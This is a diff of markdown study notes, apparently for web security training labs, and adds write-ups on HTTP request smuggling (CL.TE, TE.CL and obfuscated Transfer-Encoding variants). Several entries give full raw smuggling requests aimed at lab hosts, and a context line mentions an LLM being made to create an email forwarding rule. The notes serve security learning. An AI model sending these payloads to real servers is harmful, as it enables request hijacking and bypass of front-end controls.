@@ -3908,11 +3908,15 @@ LLM -> API: create_email_forwarding_rule('peter')
   - detect the CL.TE vulnerability
   - confirm the CL.TE vulnerability
 
-Finding HTTP request smuggling vulnerabilities
-- ![CL.TE timing vulnerabilities](img/CL.TE_timing.png)
-- ![TE.CL timing vulnerabilities](img/TE.CL_timing.png)
-- ![CL.TE different response vulnerabilities](img/CL.TE_different_response.png)
-- ![TE.CL different response vulnerabilities](img/TE.CL_different_response.png)
+**Finding HTTP request smuggling vulnerabilities**
+- Finding CL.TE vulnerabilities using timing techniques  
+  ![CL.TE timing vulnerabilities](img/CL.TE_timing.png)
+- Finding TE.CL vulnerabilities using timing techniques  
+  ![TE.CL timing vulnerabilities](img/TE.CL_timing.png)
+- Confirming CL.TE vulnerabilities using differential responses  
+  ![CL.TE different response vulnerabilities](img/CL.TE_different_response.png)
+- Confirming TE.CL vulnerabilities using differential responses
+  ![TE.CL different response vulnerabilities](img/TE.CL_different_response.png)
 
 **Mitigation**
 - Interpret HTTP headers consistently on front-end and back-end servers
@@ -3931,62 +3935,77 @@ Finding HTTP request smuggling vulnerabilities
 - You need to include the trailing sequence `\r\n\r\n` following the **final 0**
 
 - HTTP request smuggling, basic CL.TE vulnerability
-  - Info:  This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method
+  - Info:  This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. The front-end server rejects requests that **aren't using the GET or POST method**
   - https://www.youtube.com/watch?v=4S5fkKJ4SM4
     ```
     POST / HTTP/1.1
     Host: 0a920089043f493082a106b80066006f.web-security-academy.net
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 6
-    Transfer-Encoding: chunked\r\n
-    \r\n
+    Transfer-Encoding: chunked
+
     0\r\n
     \r\n
     G
     ```
     ![CL.TE vulnerabilities](img/CL.TE%20vulnerabilities.png)
  - second request throw response "Unrecognized method GPOST"
-   - Info: This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method 
+   - Info: This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. The front-end server rejects requests that **aren't using the GET or POST method** 
    - https://www.youtube.com/watch?v=kIRIV-BwBTE
      ```
      POST / HTTP/1.1
      Host: YOUR-LAB-ID.web-security-academy.net
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
-     Transfer-Encoding: chunked\r\n
-     \r\n
-     5c\r\n
-     GPOST / HTTP/1.1\r\n
-     Content-Type: application/x-www-form-urlencoded\r\n
-     Content-Length: 15\r\n
-     \r\n
-     x=1\r\n
+     Transfer-Encoding: chunked
+
+     5c
+     GPOST / HTTP/1.1
+     Content-Type: application/x-www-form-urlencoded
+     Content-Length: 15
+
+     x=1
      0\r\n
      \r\n
      ```
      ![TE.CL vulnerabilities](img/CL.TE%20vulnerabilities.png)
 - HTTP request smuggling, obfuscating the TE header
-  - Info: This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
+  - Info: This lab involves a front-end and back-end server, and the **two servers handle duplicate HTTP request headers in different ways**. The front-end server rejects requests that **aren't using the GET or POST method**.
   - https://www.youtube.com/watch?v=TUsc14YH6LE
     ```
     POST / HTTP/1.1
     Host: 0a6b001c04502e3b80f753da0015003a.web-security-academy.net
     Content-Type: application/x-www-form-urlencoded
-    Content-length: 4\r\n
-    Transfer-Encoding: chunked\r\n
-    Transfer-encoding: cow\r\n
-    \r\n
-    5c\r\n
-    GPOST / HTTP/1.1\r\n
-    Content-Type: application/x-www-form-urlencoded\r\n
-    Content-Length: 15\r\n
-    \r\n
-    x=1\r\n
+    Content-length: 4
+    Transfer-Encoding: chunked
+    Transfer-encoding: cow
+
+    5c
+    GPOST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 15
+   
+    x=1
     0\r\n
     \r\n
     ```
      ![TE.TE vulnerabilities](img/TE.TE%20vulnerabilities.png)
-- dd
+- HTTP request smuggling, confirming a **CL.TE vulnerability via differential responses**
+  - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
+  - https://www.youtube.com/watch?v=WB_E6EybP_o
+    ```
+    POST / HTTP/1.1
+    Host: 0aac001703d4324181e7deab00900007.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 35
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /404 HTTP/1.1
+    X-Ignore: X
+    ```
+ - Response: HTTP/1.1 404 Not Found
 - dd
 - dd
 - dd
